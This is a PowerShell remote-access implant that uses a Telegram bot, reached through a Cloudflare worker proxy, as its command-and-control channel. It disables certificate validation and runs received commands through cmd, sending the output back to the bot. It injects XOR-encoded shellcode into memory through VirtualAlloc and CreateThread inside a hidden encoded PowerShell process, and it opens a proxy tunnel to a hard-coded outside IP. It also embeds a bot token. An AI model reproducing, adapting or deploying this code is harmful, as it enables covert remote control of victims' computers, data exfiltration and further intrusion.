#####################################################################################################################################################
# Check SSL Navigation Bypass 

function ssl-bypass{
add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
            return true;
        }
 }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
}

#####################################################################################################################################################
# CONFIG - Setting Global Variable 

$lambda  = "disagio.delaurentis.workers.dev"
$token   = '5157005211:AAHCliP0jJpJM5-RYYkso0pzbSQdMy9gIJY'
$chat_id = '176932540'
$usra    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Edg/100.0.1185.39"    


#####################################################################################################################################################
# Set Lambda

$getMeLink = "https://$lambda/bot$token/getMe"
$sendMessageLink = "https://$lambda/bot$token/sendMessage"
$forwardMessageLink = "https://$lambda/bot$token/forwardMessage"
$sendPhotoLink = "https://$lambda/bot$token/sendPhoto"
$sendAudioLink = "https://$lambda/bot$token/sendAudio"
$sendDocumentLink = "https://$lambda/bot$token/sendDocument"
$sendStickerLink = "https://$lambda/bot$token/sendSticker"
$sendVideoLink = "https://$lambda/bot$token/sendVideo"
$sendLocationLink = "https://$lambda/bot$token/sendLocation"
$sendChatActionLink = "https://$lambda/bot$token/sendChatAction"
$getUserProfilePhotosLink = "https://$lambda/bot$token/getUserProfilePhotos"
$getUpdatesLink = "https://$lambda/bot$token/getUpdates"
$setWebhookLink = "https://$lambda/bot$token/setWebhook"


#####################################################################################################################################################
# Prep-Body
function prep-body{
Param (
        [String]$mex= " "
      )
 
$payload = New-Object psobject
$payload | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $chat_id 
$payload | Add-Member -MemberType NoteProperty -Name 'text' -Value $mex
$body = $payload | ConvertTo-Json
$body

}

#####################################################################################################################################################
# MENU
function invoke-menu {
$body_menu = @"
MENU:
shell-exec
rev-tunnel
rev-stage
bypassandreasalvati                                                                                                                                                                                                                                                                                                                                       

"@
$body_menu
}

#####################################################################################################################################################
# sleep-up
function sleep-up{
Param (
        [int]$time_sleep_up= 1,
        [int]$random_seed_up =5
      )

$random_time_up = Get-Random -Maximum $random_seed_up
$effective_time_up = $time_sleep_up + $random_time_up
Start-Sleep -s $effective_time_up

}

#####################################################################################################################################################
# sleep-cl
function sleep-cl{
Param (
        [int]$time_sleep_cl= 1,
        [int]$random_seed_cl =5
      )

$random_time_cl = Get-Random -Maximum $random_seed_cl
$effective_time_cl = $time_sleep_cl + $random_time_cl
Start-Sleep -s $effective_time_cl

}

#####################################################################################################################################################
# sleep-up
function sleep-dw{
Param (
        [int]$time_sleep_dw= 25,
        [int]$random_seed_dw =10
      )

$random_time_dw = Get-Random -Maximum $random_seed_dw
$effective_time_dw = $time_sleep_dw + $random_time_dw
Start-Sleep -s $effective_time_dw


}

#####################################################################################################################################################
# rev-stage

function rev-stage {

$verfunc2 = 
{

sleep -Seconds 4


$h = '[Byte[]] $buf = 0xeb,0x27,0x5b,0x53,0x5f,0xb0,0xe,0xfc,0xae,0x75,0xfd,0x57,0x59,0x53,0x5e,0x8a,0x6,0x30,0x7,0x48,0xff,0xc7,0x48,0xff,0xc6,0x66,0x81,0x3f,0x55,0x3c,0x74,0x7,0x80,0x3e,0xe,0x75,0xea,0xeb,0xe6,0xff,0xe1,0xe8,0xd4,0xff,0xff,0xff,0x6,0x13,0xe,0xfa,0x5b,0x85,0xf7,0xf6,0xfb,0xca,0x13,0x6,0x13,0x47,0x42,0x47,0x43,0x54,0x42,0x50,0x5b,0x37,0xc1,0x63,0x5b,0x8d,0x41,0x66,0x5b,0x8d,0x41,0x1e,0x5b,0x8d,0x41,0x26,0x5e,0x37,0xda,0x4e,0x1c,0xb1,0x59,0x4c,0x5b,0x8d,0x61,0x56,0x5b,0x37,0xd3,0xaa,0x2f,0x67,0x6f,0x4,0x3f,0x26,0x52,0xc7,0xda,0xb,0x52,0x7,0xd2,0xe4,0xfe,0x54,0x5b,0x8d,0x41,0x26,0x98,0x44,0x2f,0x4e,0x12,0xd6,0x75,0x87,0x6b,0x1e,0x18,0x4,0x52,0x57,0x1c,0x83,0x61,0x6,0x13,0x6,0x98,0x86,0x9b,0x6,0x13,0x6,0x5b,0x83,0xd3,0x72,0x74,0x4e,0x12,0xd6,0x98,0x4e,0xb,0x42,0x98,0x46,0x33,0x4f,0x12,0xd6,0x43,0xe5,0x45,0x4b,0x22,0xcf,0x5b,0xf9,0xda,0x47,0x98,0x32,0x9b,0x4e,0x12,0xd0,0x5b,0x37,0xd3,0xaa,0x52,0xc7,0xda,0xb,0x52,0x7,0xd2,0x3e,0xf3,0x73,0xe2,0x4a,0x10,0x4a,0x37,0xe,0x56,0x3f,0xc2,0x73,0xcb,0x5e,0x57,0x8d,0x53,0x22,0x5a,0x7,0xc3,0x60,0x52,0x8d,0x1f,0x4e,0x57,0x8d,0x53,0x1a,0x5a,0x7,0xc3,0x47,0x98,0x2,0x9b,0x47,0x4b,0x4e,0x12,0xd6,0x52,0x5e,0x4d,0x5f,0x49,0x47,0x4b,0x47,0x4a,0x47,0x49,0x4e,0x90,0xea,0x33,0x47,0x41,0xf9,0xf3,0x5e,0x52,0x5f,0x49,0x4e,0x98,0x14,0xfa,0x4d,0xec,0xf9,0xec,0x5b,0x5a,0xb8,0x64,0x75,0x21,0x59,0x20,0x34,0x13,0x6,0x52,0x50,0x5a,0x8f,0xf5,0x4e,0x92,0xea,0xb3,0x7,0x13,0x6,0x5a,0x8f,0xf6,0x4f,0xaf,0x4,0x13,0x13,0xa0,0x79,0x13,0x6,0x12,0x47,0x47,0x4f,0x9a,0xe2,0x5f,0x8f,0xe2,0x47,0xa9,0x4a,0x64,0x20,0x14,0xf9,0xc6,0x4a,0x9a,0xec,0x7b,0x7,0x12,0x6,0x13,0x5f,0x52,0xbc,0x3a,0x86,0x78,0x6,0xec,0xd3,0x79,0xc,0x52,0x58,0x43,0x56,0x5e,0x37,0xda,0x4b,0x22,0xc6,0x5b,0xf9,0xd3,0x4e,0x9a,0xc4,0x5b,0xf9,0xd3,0x4e,0x9a,0xc7,0x52,0xbc,0xf9,0x9,0xcc,0xe6,0xec,0xd3,0x5b,0x8f,0xd4,0x6c,0x3,0x47,0x4b,0x4a,0x9a,0xe4,0x5b,0x8f,0xea,0x47,0xa9,0x9f,0xb6,0x72,0x72,0xf9,0xc6,0x83,0xd3,0x72,0x19,0x4f,0xec,0xc8,0x66,0xe3,0xfb,0x19,0x12,0x6,0x13,0x4e,0x90,0xea,0x3,0x4e,0x9a,0xe4,0x5e,0x37,0xda,0x6c,0x17,0x47,0x4b,0x4e,0x9a,0xff,0x52,0xbc,0x11,0xdf,0xdb,0x59,0xec,0xd3,0x90,0xfe,0x13,0x9,0x9d,0x6b,0x13,0x6,0x13,0x4e,0x90,0xc2,0x33,0x58,0x9a,0xf0,0x92,0xf0,0x29,0x90,0x17,0x62,0x5f,0x8b,0x8d,0x6,0x12,0x6,0x13,0x6c,0x53,0x47,0x4a,0x6e,0x13,0x16,0x13,0x6,0x52,0x5e,0x5b,0x8f,0xe1,0x4e,0x22,0xcf,0x52,0xbc,0x4b,0xa2,0x40,0xe3,0xec,0xd3,0x5b,0x8b,0x8b,0x6,0x12,0x6,0x13,0x4f,0x9a,0xd9,0x40,0x50,0x43,0x4b,0x22,0xcf,0x5a,0x8f,0xe3,0x4e,0x9a,0xdc,0x5b,0x8f,0xea,0x47,0xa9,0x4,0xca,0xce,0x4c,0xf9,0xc6,0x4e,0x90,0xc2,0x33,0x85,0xeb,0x6,0x6e,0x2e,0x4b,0x47,0x44,0x5f,0x7b,0x6,0x53,0x6,0x13,0x47,0x4b,0x6c,0x13,0x5c,0x52,0xbc,0x18,0x29,0x1c,0x36,0xec,0xd3,0x44,0x5f,0x52,0xbc,0x66,0x68,0x5e,0x67,0xec,0xd3,0x5a,0xf9,0xdd,0xef,0x33,0xf9,0xec,0xf9,0x5b,0x7,0xd0,0x4e,0x3a,0xc0,0x66,0xb5,0x5a,0x8f,0xed,0x59,0x4a,0x47,0x4a,0x47,0x45,0xee,0x3,0x6,0x13,0x6,0xc0,0x6a,0x8,0x8d,0xbe,0x1e,0x2d,0xd3,0x6d,0xe1,0x8f,0x8,0x2a,0x93,0x2f,0xc8,0x4d,0x4e,0x22,0xc6,0x5a,0x8f,0xeb,0xac,0xed,0xc6,0x66,0xfd,0x5b,0x37,0xc8,0x47,0x11,0x1a,0x13,0x4e,0x9a,0xc4,0x93,0xe4,0x1c,0x4,0xf,0x10,0x52,0x8c,0x7,0x6,0x52,0x80,0x7,0x1e,0x52,0x8e,0x7,0x6,0xed,0xc6,0x66,0xe5,0x5b,0x37,0xc8,0xf8,0xd3,0x47,0x11,0x1a,0x13,0x47,0x99,0x12,0x13,0x47,0x95,0x12,0xb,0x47,0x9b,0x12,0x13,0x47,0x11,0x12,0xb,0x47,0x99,0x12,0x3,0x47,0x23,0x17,0x5a,0xf9,0xd2,0x4e,0xec,0xcf,0x66,0xdd,0x4c,0x47,0xec,0xe1,0x4b,0x6c,0x13,0x5f,0x5a,0xc1,0xd1,0xf6,0xa6,0xa4,0x45,0xf9,0xc6,0x55,0x3c'
$pay = $h -split ("=")
$payload_in= $pay[1] -replace (" ", "")

$SidwrSvYFsSvAyS = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$qyxDrpqBSyUe = Add-Type -memberDefinition $SidwrSvYFsSvAyS -Name "Win32" -namespace Win32Functions -passthru
$paybuf = $payload_in -split (",")
[Byte[]] $iuLmEwmUJ = $paybuf

$VKvESXXja = $qyxDrpqBSyUe::VirtualAlloc(0,[Math]::Max($iuLmEwmUJ.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($iuLmEwmUJ,0,$VKvESXXja,$iuLmEwmUJ.Length)

$qyxDrpqBSyUe::CreateThread(0,0,$VKvESXXja,0,0,0)

While($true)
    { 
    $i++
    $azz =$azz
    }
}

$commandEncoded = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($verfunc2))

$a=New-Object System.Diagnostics.ProcessStartInfo;
$a.FileName= 'C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe'
$pass = 'iex(New-Object IO.StreamReader(([IO.MemoryStream][Convert]::FromBase64String(' + '\"'  + $commandEncoded + '\"'  +')),[Text.Encoding]::Unicode)).ReadToEnd()'
$a.Arguments='  -c {0}' -f $pass
$a.UseShellExecute=$false;
$a.RedirectStandardOutput=$true;
$a.WindowStyle='Hidden';
$a.CreateNoWindow=$true;
$pr=[System.Diagnostics.Process]::Start($a);
# $pr.WaitForExit()

}

#####################################################################################################################################################
# rev-tunnel

Function rev-tunnel {

Param (
        [String]$destHostX = "134.209.187.111",
        [Int]$destPortX = 8080,
        [String]$LocalIPX = "127.0.0.1",
        [Int]$bindPortX = 5555,
        [string]$proxysetX="10.30.38.46",
        [Int]$proxyPortX= 8080
     )

# Blocco in previsione di un setting lato server - find proxy
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name DisableCachingOfSSLPages -Value 0 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name "IE5_UA_Backup_Flag" -Value "5.0"
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name PrivacyAdvanced -Value 1 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name SecureProtocols -Value 2720 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name CertificateRevocation -Value 1 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name SyncMode5 -Value 3 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name EnableHTTP1_1 -Value 1 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyHTTP1.1 -Value 1 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ShowPunycode -Value 0 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name EnablePunycode -Value 1 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name UrlEncoding -Value 0 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name DisableIDNPrompt -Value 0 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name EnableNegotiate -Value 1 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name WarnonBadCertRecving -Value 1 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name WarnonZoneCrossing -Value 0 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name WarnOnPostRedirect -Value 1 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 0 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name AutoDetect -Value 0 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name EnableAutodial -Value 0 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name NoNetAutodial -Value 0 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name MigrateProxy -Value 1 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name EnableHTTP2 -Value 1 -Type DWord
# Fine Blocco in previsione di un setting lato server - find proxy

$verfunc = {

Param (
        [String]$destHost =  [String]$destHostX,
        [Int]$destPort =  [Int]$destPortX,
        [Int]$bindPort = [Int]$bindPortX,
        [String]$bindIP = [String]$LocalIPX -as [int],
        [string]$proxyset=$proxysetX,
        [Int]$proxyPort= $proxyPortX
      )

$clientBuffer = new-object System.Byte[] 1024
$request = [System.Net.HttpWebRequest]::Create("http://" + $destHost + ":" + $destPort ) 
$request.Method = "CONNECT"
$hostparam = "$destHost" + ":" + $destPort
$request.Host = $hostparam
$ind_proxy = "http://" + $proxyset + ":" + $proxyPort
$proxy = [System.Net.WebProxy]::new("$ind_proxy") # without Auth
$proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$request.Proxy = $proxy
$listener = new-object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Parse($bindIP), $bindPort)

$Script = {
	param($state)
	$serverBuffer = new-object System.Byte[] 1024
	
	$count = 0
	do {
		$count = $state.serverStream.Read($serverBuffer, 0 ,$serverBuffer.length)
		$state.clientStream.Write($serverBuffer, 0 , $count)
		$state.clientStream.Flush()
	} while ($count -gt 0)
}

#-------------------------------------------------------------------------
# Starting the TCP listener
$listener.start()

write-host "Waiting for a connection on port $bindPort..."
$client = $listener.AcceptTcpClient()
write-host "Connected from $($client.Client.RemoteEndPoint)"

#----------------------------------------------------------------------------------------------------
# Get the client side stream object to read/write to
$clientStream = $client.GetStream() # This is a System.Net.Sockets.NetworkStream

#----------------------------------------------------------------------------------------------------
# Get the server side response and corresponding stream object to read/write to
$serverResponse = $request.GetResponse()
$responseStream = $serverResponse.GetResponseStream()

#----------------------------------------------------------------------------------------------------
# Reflection inspection to retrieve and reuse the underlying networkStream instance
$BindingFlags= [Reflection.BindingFlags] "NonPublic,Instance"
$rsType = $responseStream.GetType()
$connectionProperty = $rsType.GetProperty("Connection", $BindingFlags)
$connection = $connectionProperty.GetValue($responseStream, $null)
$connectionType = $connection.GetType()
$networkStreamProperty = $connectionType.GetProperty("NetworkStream", $BindingFlags)
$serverStream = $networkStreamProperty.GetValue($connection, $null)

# This state object is used to pass various object by reference to the child PowerShell object (thread)
# that is created afterwards
$state = [PSCustomObject]@{"serverStream"=$serverStream;"clientStream"=$clientStream}

# Create a child PowerShell object to run the background Socket receive method.
$PS = [PowerShell]::Create()
$PS.AddScript($Script).AddArgument($state) | Out-Null
[System.IAsyncResult]$AsyncJobResult = $null

try
{
	# The receive job is started asynchronously.
	$AsyncJobResult = $PS.BeginInvoke()
		
	do {
		$bytesReceived = $clientStream.Read($clientBuffer, 0, $clientBuffer.length)
		$serverStream.Write($clientBuffer, 0 , $bytesReceived)
		#$text = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesReceived)
		#Write-Host $text
		
	} while ($client.Connected -or $clientStream.DataAvailable)
}
catch {
	$ErrorMessage = $_.Exception.Message
	Write-Host $ErrorMessage
}
finally 
    {
	    # Cleanup the client socket and child PowerShell process.
        if ($client -ne $null) {
            $client.Close()
            $client.Dispose()
            $client = $null
        }
	
	    if ($listener -ne $null) {
		    $listener.Stop()
	    }
	    write-host "Connection closed."
        if ($PS -ne $null -and $AsyncJobResult -ne $null) {
        $PS.EndInvoke($AsyncJobResult)
        $PS.Dispose()
        }
    }
}

$newRunspace =[runspacefactory]::CreateRunspace()
$newRunspace.ApartmentState = "STA"
$newRunspace.ThreadOptions = "UseNewThread"         
$newRunspace.Open()
$psCmd = [PowerShell]::Create().AddScript($verfunc)
$psCmd.AddArgument("$destHostX")
$psCmd.AddArgument([Int]$destPortX)
$psCmd.AddArgument([Int]$bindPortX)
$psCmd.AddArgument([String]$LocalIPX)
$psCmd.AddArgument([string]$proxysetX)
$psCmd.AddArgument([Int]$proxyPortX)
$psCmd.Runspace = $newRunspace
$dataX = $psCmd.BeginInvoke()
}


#####################################################################################################################################################
# send-message
function send-message{
Param (
        [String]$send_text_messageblock= " "
      )


if ($send_text_messageblock.Length -ge 4098 )
                                  {
                                  # Se l'info in uscita è maggiore di 4098 il messaggio non può essere inviato
                                  # Dividendo la Lunghezza per 4098 + 1, otteniamo il numero di messaggi minimo 
                                  # - da effettuare per trasportare l'informazione
                                  # - $n è il numero di blocchi necessari al trasportp
                                  # - $Dim_Block è la dimensione dei blocchi
                                                
                                  # Calcolo numero blocchi
                                  [int]$H= $send_text_messageblock.Length / 4098
                                  $n = $H + 1 ; $n
                                  # Calcolo Dimensione bloccho
                                  [int]$Dim_B= $send_text_messageblock.Length / $n
                                  [int]$Dim_Block = [int]$Dim_B +1 
                                  do {$Dim_Block= $Dim_Block+1}until($Dim_Block % 4 -eq 0)
                                           
                                  # Encoding ADSecurity.org
                                  $Bytes = [System.Text.Encoding]::UTF8.GetBytes($send_text_messageblock)
                                  $EncodedText =[Convert]::ToBase64String($Bytes)
                                  
                                  # Funzione di split dei blocchi e puliziz dell'array da blocchi vuoti 
                                  $EncodedText_array = $EncodedText -Split "(.{$Dim_Block})"
                                  $array_encodedMessage = $EncodedText_array  | Where-Object {$_}
                                                
                                  # Ciclo "Send" dei blocchi
                                  foreach ($mex_encoded in  $array_encodedMessage)
                                          {
                                          $url = "https://$lambda/bot{0}" -f $token
                                          # Decoding dei blocchi
                                          $mex_Decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($mex_encoded))
                                                        
                                          #Creazione Body per le POST (Evita le GET troppo lunghe)
                                          
                                          $body_mex = prep-body -mex $mex_Decoded
                                                        
                                          #write-host -ForegroundColor Yellow $mex.Length
                                          Invoke-RestMethod -method Post -Uri ($url +'/sendMessage') -Body ($body_mex)  -ContentType 'application/json' -UserAgent $usra

                                          # Temporizzazione random di ritorno
                                          sleep-cl
                                          }
                                  }
                                  else
                                  {
                               
                                  $url = "https://$lambda/bot{0}" -f $token
                                  $enc = [System.Text.Encoding]::GetEncoding(1252).GetBytes($send_text_messageblock)
                                  $Text1 = [System.Text.Encoding]::UTF8.GetString($enc)
                                  $body_mex = prep-body -mex $Text1 ###
                                  # write-host -ForegroundColor Yellow $encodedMessage.Length
                                  Invoke-RestMethod -method Post -Uri ($url +'/sendMessage') -Body ($body_mex)  -ContentType 'application/json' -UserAgent $usra
                                  }      
 }                   

#####################################################################################################################################################

ssl-bypass

# Stampa Token
write-host $token

#Reset Variabili
$offset = 0
$encodedMessage = ""
$comex= ""

while($true) {
    $json = Invoke-WebRequest -Uri $getUpdatesLink  -Body @{offset=$offset}  -UserAgent $usra | ConvertFrom-Json 
  
    Write-Host $json 
    Write-Host $json.ok 
    $l = $json.result.length 
    $i = 0 
    Write-Host $json.result 
    Write-Host $json.result.length
    while ($i -lt $l) {
          $offset = $json.result[$i].update_id + 1 
          [string]$command = $json.result[$i].message  
          if ($command -match "shell-exec")
                      {
                      # Se il messaggio contiene SHELLZ attivati
                      sleep-up
                      $comex =  ([regex]'shell-exec').split($json.result.message.text)
                      [string]$result = cmd /c ($comex[1]+" 2>&1");
                      $encodedMessage = $result 
                      send-message -send_text_messageblock $encodedMessage
                      }
           
           elseif($command -match "bypassandreasalvati"){
                      $andrea = 'Ma vuoi davvero infierire?'
                      send-message  -send_text_messageblock $andrea
                      sleep-up
           }
           
           elseif($command -match "HELP"){
                    $menu = invoke-menu
                    send-message  -send_text_messageblock $menu
                    sleep-up
           }

           elseif($command -match "rev-tunnel"){
                    rev-tunnel
                    
           }

           elseif($command -match "rev-stage"){
                    rev-stage
                    
           }


           $i++
    # Fine Parsing dei messaggi "Comando" del C2
    }

sleep-dw 

# Fine ciclo continuo
}





<#
########################################################################################################
/**
 * An object with different URLs to fetch
 * @param {Object} ORIGINS
 */
const ORIGINS = {
  '          ': 'api.telegram.org',
  '          ': 'www.google.com',
};
function handleRequest(request) {
  const url = new URL(request.url);
  // Check if incoming hostname is a key in the ORIGINS object
  if (url.hostname in ORIGINS) {
    const target = ORIGINS[url.hostname];
    url.hostname = target;
    // If it is, proxy request to that third party origin
    return fetch(url.toString(), request);
  }
  // Otherwise, process request as normal
  return fetch(request);
}
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});
########################################################################
#>
